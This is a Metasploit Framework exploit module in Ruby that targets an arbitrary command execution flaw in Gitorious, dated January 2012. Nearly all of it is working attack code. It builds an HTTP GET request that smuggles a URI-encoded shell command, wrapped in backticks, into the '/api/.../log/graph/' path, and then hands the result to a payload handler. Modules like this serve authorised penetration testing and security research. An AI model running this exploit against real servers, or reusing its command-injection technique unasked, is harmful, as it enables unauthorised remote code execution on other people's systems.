##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Gitorious Arbitrary Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution vulnerability in the
					in gitorious. Unvalidated input is send to the shell allowing command execution.
			},
			'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #Phenoelit
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://gitorious.org/gitorious/mainline/commit/647aed91a4dc72e88a27476948dfbacd5d0bf7ce' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'BadChars' => "\x60",
					'DisableNops' => true,
					'Space'       => 31337,
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
						}
				},
			'Platform'       => [ 'unix', 'linux' ],
			'Arch'           => ARCH_CMD,
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jan 19 2012'
			))

			register_options(
				[
					OptString.new('URI', [true, "Path to project and repository", "/project/repo"]),
				], self.class)
	end

	def exploit
		# Make sure the URI begins with a slash
		uri = datastore['URI']
		if uri[0,1] != '/'
			uri = '/' + uri
		end

		# Make sure the URI ends without a slash, because it's already part of the URI
		if uri[-1, 1] == '/'
			uri = uri[0, uri.length-1]
		end

		command = Rex::Text.uri_encode(payload.raw, 'hex-all')
		command.gsub!("%20","%2520")
		res = send_request_cgi({
			'uri'     => "/api"+ uri + "/log/graph/%60#{command}%60",
			'method'  => 'GET',
			'headers' =>
			{
				'Connection' => 'Close',
			}
		}) #default timeout, we don't care about the response

		if (res)
			print_status("The server returned: #{res.code} #{res.message}")
		end

		handler
	end

end
